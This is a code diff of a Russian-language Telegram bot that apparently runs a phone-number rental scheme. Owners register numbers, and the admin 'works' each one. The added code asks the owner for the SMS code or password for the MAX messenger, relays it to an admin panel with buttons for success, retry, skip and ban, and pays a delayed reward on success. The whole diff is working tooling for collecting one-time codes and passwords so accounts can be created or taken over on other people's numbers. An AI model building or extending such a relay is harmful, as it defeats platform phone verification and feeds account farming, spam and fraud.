@@ -63,9 +63,15 @@ CODE_TIMEOUT_SEC  = 60
 CODE_REWARD       = float(os.getenv("CODE_REWARD_RUB", "50"))
 RATE_LIMIT        = float(os.getenv("RATE_LIMIT_SEC", "1.0"))
 CALLBACK_RATE     = float(os.getenv("CALLBACK_RATE_SEC", "0.3"))
+REWARD_DELAY_SEC  = 5 * 60  # задержка начисления награды после «Встал»
 PHONE_HINT        = "Только номер России: +79991234567 (11 цифр, начинается с +7)"
 
-_timer_task: asyncio.Task | None = None
+_timer_task:          asyncio.Task | None = None
+_reward_task:         asyncio.Task | None = None
+_admin_ctrl_msg_id:   int | None          = None   # ID сообщения-панели у админа
+_admin_ctrl_chat_id:  int | None          = None
+_password_mode:       bool                = False  # ожидаем код от владельца
+_password_attempts:   int                 = 0      # оставшихся попыток «Повтор»
 
 
 class ThrottleMiddleware(BaseMiddleware):
@@ -240,6 +246,33 @@ def work_inline() -> InlineKeyboardMarkup:
 _CANCEL_KB = InlineKeyboardMarkup(inline_keyboard=[[
     InlineKeyboardButton(text="❌ Отменить", callback_data="reg:cancel"),
 ]])
+
+
+def active_inline() -> InlineKeyboardMarkup:
+    """Панель управления активным номером (для админа)."""
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text="✅ Встал",      callback_data="active:met"),
+            InlineKeyboardButton(text="🔑 Пароль",    callback_data="active:password"),
+        ],
+        [
+            InlineKeyboardButton(text="⏩ Скип",       callback_data="active:skip"),
+            InlineKeyboardButton(text="🚫 Бан номера", callback_data="active:ban"),
+        ],
+    ])
+
+
+def password_inline() -> InlineKeyboardMarkup:
+    """Панель после запроса пароля/передачи кода (для админа)."""
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text="✅ Встал",  callback_data="password:met"),
+            InlineKeyboardButton(text="🔄 Повтор", callback_data="password:repeat"),
+        ],
+        [
+            InlineKeyboardButton(text="⏩ Скип",   callback_data="password:skip"),
+        ],
+    ])
 
 
 # ─── Форматирование ─────────────────────────────────────────────────────────
@@ -591,8 +624,10 @@ async def _finish_register(message: Message, state: FSMContext, phone: str) -> N
     prompt_msg_id  = data.get("prompt_msg_id")
     prompt_chat_id = data.get("prompt_chat_id", message.chat.id)
 
-    existing = store.owner_by_phone(phone)
-    if existing and existing.user_id != user.id:
+    if store.is_phone_banned(phone):
+        await state.clear()
+        result = "🚫 Этот номер заблокирован. По вопросам обращайтесь в тех. поддержку."
+    elif (existing := store.owner_by_phone(phone)) and existing.user_id != user.id:
         await state.clear()
         result = "❌ Этот номер уже зарегистрирован. Обратитесь к администратору."
     else:
@@ -669,13 +704,33 @@ async def _start_code_timer(bot: Bot, req: CodeRequest) -> None:
     _timer_task = asyncio.create_task(_on_timeout())
 
 
+async def _schedule_reward(bot: Bot, owner_id: int, phone: str) -> None:
+    """Начисляет награду владельцу через REWARD_DELAY_SEC секунд."""
+    global _reward_task
+
+    async def _pay() -> None:
+        await asyncio.sleep(REWARD_DELAY_SEC)
+        profile = store.record_code_success(owner_id, CODE_REWARD)
+        note = (
+            f"💰 Начислено *{CODE_REWARD:.0f}$* · баланс *{profile.balance:.2f}$*"
+            if CODE_REWARD > 0 else "✅ Номер подтверждён."
+        )
+        try:
+            await bot.send_message(owner_id, note, parse_mode="Markdown",
+                                   reply_markup=owner_menu_inline())
+        except Exception:
+            pass
+
+    _reward_task = asyncio.create_task(_pay())
+
+
 async def _notify_owner_request(bot: Bot, req: CodeRequest) -> bool:
+    """Уведомляет владельца что его номер берётся в работу."""
     try:
         await bot.send_message(
             req.owner_id,
-            f"🔐 *Запрос кода MAX*\n\nНомер: `{req.phone}`\n"
-            f"⏱ У вас *{CODE_TIMEOUT_SEC} сек* чтобы прислать *{CODE_LEN} цифр*.\n\n"
-            "Просто отправьте код ответным сообщением.",
+            f"📱 *Ваш номер берётся в работу*\n\nНомер: `{req.phone}`\n"
+            "Ожидайте запроса пароля или кода.",
             parse_mode="Markdown",
             reply_markup=owner_code_request_inline(),
         )
@@ -685,19 +740,70 @@ async def _notify_owner_request(bot: Bot, req: CodeRequest) -> bool:
         return False
 
 
+async def _request_password_from_owner(bot: Bot, req: CodeRequest, attempt: int) -> None:
+    """Запрашивает у владельца код/пароль (вызывается по кнопке «Пароль»/«Повтор»)."""
+    try:
+        await bot.send_message(
+            req.owner_id,
+            f"🔑 *Нужен пароль/код для номера* `{req.phone}`\n"
+            f"Попытка *{attempt}/2* · отправьте *{CODE_LEN} цифр*.",
+            parse_mode="Markdown",
+            reply_markup=owner_code_request_inline(),
+        )
+    except Exception:
+        log.warning("Не удалось запросить пароль у владельца %s", req.owner_id)
+
+
+async def _forward_code_to_admin(bot: Bot, req: CodeRequest, code: str) -> None:
+    """Пересылает полученный код на панель управления админа."""
+    global _admin_ctrl_msg_id, _admin_ctrl_chat_id, _password_attempts
+    if _password_attempts > 0:
+        _password_attempts -= 1
+    attempts_note = f"\n⚠️ Осталось повторов: {_password_attempts}" if _password_mode else ""
+    text = (
+        f"📱 *{mask_phone(req.phone)}*\n"
+        f"🔑 Код от владельца: `{code}`{attempts_note}\n\n"
+        "Нажмите *Встал* если сработало, *Повтор* для нового кода или *Скип*."
+    )
+    kb = password_inline()
+    if _admin_ctrl_msg_id and _admin_ctrl_chat_id:
+        try:
+            await bot.edit_message_text(
+                text, chat_id=_admin_ctrl_chat_id, message_id=_admin_ctrl_msg_id,
+                parse_mode="Markdown", reply_markup=kb,
+            )
+            return
+        except Exception:
+            pass
+    try:
+        sent = await bot.send_message(
+            req.admin_id, text, parse_mode="Markdown", reply_markup=kb,
+        )
+        _admin_ctrl_msg_id  = sent.message_id
+        _admin_ctrl_chat_id = req.admin_id
+    except Exception:
+        log.warning("Не удалось переслать код админу %s", req.admin_id)
+
+
 async def _activate_request(bot: Bot, req: CodeRequest) -> bool:
+    global _admin_ctrl_msg_id, _admin_ctrl_chat_id, _password_mode, _password_attempts
     if not await _notify_owner_request(bot, req):
         return False
     store.set_active(req, timeout_sec=CODE_TIMEOUT_SEC)
     await _start_code_timer(bot, req)
+    _password_mode      = False
+    _password_attempts  = 0
     q = store.queue_size()
+    queue_note = f"\n📥 В очереди: {q}" if q else ""
     try:
-        await bot.send_message(
+        sent = await bot.send_message(
             req.admin_id,
-            f"⏳ Ожидание кода `{req.phone}` · {CODE_TIMEOUT_SEC} сек"
-            + (f" · В очереди: **{q}**" if q else ""),
+            f"📱 *{mask_phone(req.phone)}* — ожидание{queue_note}",
             parse_mode="Markdown",
+            reply_markup=active_inline(),
         )
+        _admin_ctrl_msg_id  = sent.message_id
+        _admin_ctrl_chat_id = req.admin_id
     except Exception:
         log.warning("Не удалось уведомить админа %s", req.admin_id)
     return True
@@ -732,7 +838,7 @@ async def _queue_all_phones(bot: Bot, admin_id: int, msg: Message) -> None:
             if status in ("active", "queued"):
                 already += 1
                 continue
-            if status == "cooldown":
+            if status in ("cooldown", "banned"):
                 cooldown += 1
                 continue
             req = CodeRequest(owner_id=owner.user_id, admin_id=admin_id, phone=phone)
@@ -769,16 +875,37 @@ async def _queue_all_phones(bot: Bot, admin_id: int, msg: Message) -> None:
 
 async def _finish_active(bot: Bot, *, reason: str, code: str | None = None,
                          message: Message | None = None) -> None:
+    global _admin_ctrl_msg_id, _admin_ctrl_chat_id, _password_mode, _password_attempts
     await _cancel_timer()
     req = store.clear_active()
     if not req:
         return
 
+    # Сброс панели управления
+    _admin_ctrl_msg_id  = None
+    _admin_ctrl_chat_id = None
+    _password_mode      = False
+    _password_attempts  = 0
+
     owner      = store.owners.get(req.owner_id)
     owner_name = owner.name if owner else str(req.owner_id)
     admin_id   = req.admin_id
 
-    if reason == "code" and code:
+    if reason == "met":
+        # Админ подтвердил «Встал» — награда через 5 минут
+        store.record_phone_success(req.phone)
+        await _schedule_reward(bot, req.owner_id, req.phone)
+        try:
+            await bot.send_message(
+                req.owner_id,
+                f"✅ Номер `{req.phone}` принят!\n"
+                f"💰 Вознаграждение придёт через 5 минут.",
+                parse_mode="Markdown", reply_markup=owner_menu_inline(),
+            )
+        except Exception:
+            pass
+
+    elif reason == "code" and code:
         profile = store.record_code_success(req.owner_id, CODE_REWARD)
         store.record_phone_success(req.phone)
         note = f"\n💰 +{CODE_REWARD:.0f}$ · баланс *{profile.balance:.2f}$*" if CODE_REWARD > 0 else ""
@@ -793,6 +920,30 @@ async def _finish_active(bot: Bot, *, reason: str, code: str | None = None,
             )
         except Exception:
             log.exception("Не удалось отправить код админу %s", admin_id)
+
+    elif reason == "skip":
+        store.record_code_fail(req.owner_id)
+        try:
+            await bot.send_message(
+                req.owner_id,
+                f"⏩ Номер `{req.phone}` пропущен.\n"
+                "По вопросам обращайтесь в тех. поддержку.",
+                parse_mode="Markdown", reply_markup=owner_menu_inline(),
+            )
+        except Exception:
+            pass
+
+    elif reason == "ban":
+        store.ban_phone(req.phone)
+        try:
+            await bot.send_message(
+                req.owner_id,
+                f"🚫 Номер `{req.phone}` заблокирован.\n"
+                "По вопросам разблокировки обращайтесь в тех. поддержку.",
+                parse_mode="Markdown", reply_markup=owner_menu_inline(),
+            )
+        except Exception:
+            pass
 
     elif reason == "timeout":
         store.record_code_fail(req.owner_id)
@@ -840,6 +991,10 @@ async def _do_request(bot: Bot, admin_id: int, phone: str, reply_to: Message | N
         return False
 
     status = store.phone_status(phone)
+    if status == "banned":
+        if reply_to:
+            await reply_to.answer(f"🚫 {mask_phone(phone)} заблокирован.")
+        return False
     if status == "active":
         if reply_to:
             await reply_to.answer(
@@ -902,6 +1057,115 @@ async def cb_owner_decline(callback: CallbackQuery, bot: Bot) -> None:
         except Exception:
             pass
     await _finish_active(bot, reason="decline")
+
+
+@router.callback_query(F.data.startswith("active:"))
+async def cb_active(callback: CallbackQuery, bot: Bot) -> None:
+    if not callback.from_user or not is_admin(callback.from_user.id):
+        await callback.answer("Только для администратора", show_alert=True)
+        return
+    req = store.active
+    if not req:
+        await callback.answer("Нет активного запроса", show_alert=True)
+        return
+    action = (callback.data or "").removeprefix("active:")
+    msg    = callback.message
+
+    if action == "met":
+        await callback.answer("✅ Встал — награда через 5 мин")
+        if isinstance(msg, Message):
+            try:
+                await msg.edit_reply_markup(reply_markup=None)
+            except Exception:
+                pass
+        await _finish_active(bot, reason="met")
+
+    elif action == "password":
+        global _password_mode, _password_attempts
+        _password_mode     = True
+        _password_attempts = 1  # 1 Повтор = 2 попытки суммарно
+        await callback.answer("🔑 Запрос пароля отправлен")
+        await _request_password_from_owner(bot, req, attempt=1)
+        if isinstance(msg, Message):
+            try:
+                await msg.edit_text(
+                    f"📱 *{mask_phone(req.phone)}*\n🔑 Запрос пароля отправлен владельцу...",
+                    parse_mode="Markdown", reply_markup=password_inline(),
+                )
+            except Exception:
+                pass
+
+    elif action == "skip":
+        await callback.answer("⏩ Скип")
+        if isinstance(msg, Message):
+            try:
+                await msg.edit_reply_markup(reply_markup=None)
+            except Exception:
+                pass
+        await _finish_active(bot, reason="skip")
+
+    elif action == "ban":
+        await callback.answer("🚫 Номер забанен")
+        if isinstance(msg, Message):
+            try:
+                await msg.edit_reply_markup(reply_markup=None)
+            except Exception:
+                pass
+        await _finish_active(bot, reason="ban")
+
+
+@router.callback_query(F.data.startswith("password:"))
+async def cb_password(callback: CallbackQuery, bot: Bot) -> None:
+    if not callback.from_user or not is_admin(callback.from_user.id):
+        await callback.answer("Только для администратора", show_alert=True)
+        return
+    req = store.active
+    if not req:
+        await callback.answer("Нет активного запроса", show_alert=True)
+        return
+    action = (callback.data or "").removeprefix("password:")
+    msg    = callback.message
+
+    if action == "met":
+        await callback.answer("✅ Встал — награда через 5 мин")
+        if isinstance(msg, Message):
+            try:
+                await msg.edit_reply_markup(reply_markup=None)
+            except Exception:
+                pass
+        await _finish_active(bot, reason="met")
+
+    elif action == "repeat":
+        global _password_mode, _password_attempts
+        if _password_attempts <= 0:
+            # Попытки исчерпаны — авто-скип
+            await callback.answer("⚠️ Попытки исчерпаны — скип", show_alert=True)
+            if isinstance(msg, Message):
+                try:
+                    await msg.edit_reply_markup(reply_markup=None)
+                except Exception:
+                    pass
+            await _finish_active(bot, reason="skip")
+            return
+        await callback.answer("🔄 Повторный запрос отправлен")
+        await _request_password_from_owner(bot, req, attempt=2)
+        if isinstance(msg, Message):
+            try:
+                await msg.edit_text(
+                    f"📱 *{mask_phone(req.phone)}*\n🔑 Повторный запрос пароля отправлен...",
+                    parse_mode="Markdown", reply_markup=password_inline(),
+                )
+            except Exception:
+                pass
+
+    elif action == "skip":
+        await callback.answer("⏩ Скип")
+        if isinstance(msg, Message):
+            try:
+                await msg.edit_reply_markup(reply_markup=None)
+            except Exception:
+                pass
+        await _finish_active(bot, reason="skip")
 
 
 @router.callback_query(F.data.startswith("reg_type:"))
@@ -1059,7 +1323,7 @@ async def cb_queue(callback: CallbackQuery) -> None:
                  f"Всего номеров: *{len(phones)}*\n"]
         for phone in phones:
             status = store.phone_status(phone)
-            icon   = "⏳" if status == "active" else ("📥" if status == "queued" else ("🕐" if status == "cooldown" else "✅"))
+            icon   = "⏳" if status == "active" else ("📥" if status == "queued" else ("🕐" if status == "cooldown" else ("🚫" if status == "banned" else "✅")))
             lines.append(f"{icon} `{mask_phone(phone)}`")
         lines.append(f"\nВ очереди: *{in_queue}* · В обработке: *{in_active}*")
         await _edit_or_answer(msg, "\n".join(lines), parse_mode="Markdown",
@@ -1246,7 +1510,8 @@ async def cmd_decline(message: Message, bot: Bot) -> None:
 @router.message(Command("code"))
 async def cmd_code(message: Message, command: CommandObject, bot: Bot) -> None:
     uid = message.from_user.id if message.from_user else 0
-    if not store.get_pending(uid):
+    req = store.get_pending(uid)
+    if not req:
         await message.answer("Нет запроса кода.", reply_markup=owner_menu_inline())
         return
     if not command.args:
@@ -1256,7 +1521,8 @@ async def cmd_code(message: Message, command: CommandObject, bot: Bot) -> None:
     if not code:
         await message.answer(f"Код — ровно {CODE_LEN} цифр.", reply_markup=owner_menu_inline())
         return
-    await _finish_active(bot, reason="code", code=code, message=message)
+    await message.answer("✅ Код отправлен администратору.", reply_markup=owner_menu_inline())
+    await _forward_code_to_admin(bot, req, code)
 
 
 # ─── FSM: ввод настроек ─────────────────────────────────────────────────────
@@ -1330,7 +1596,8 @@ async def on_text(message: Message, bot: Bot, state: FSMContext) -> None:
         if not code:
             await message.answer(f"Код — {CODE_LEN} цифр (например 123456). Отказ: /decline")
             return
-        await _finish_active(bot, reason="code", code=code, message=message)
+        await message.answer("✅ Код отправлен администратору.", reply_markup=owner_menu_inline())
+        await _forward_code_to_admin(bot, req, code)
         return
 
     if is_admin(uid) or can_be_owner(uid):
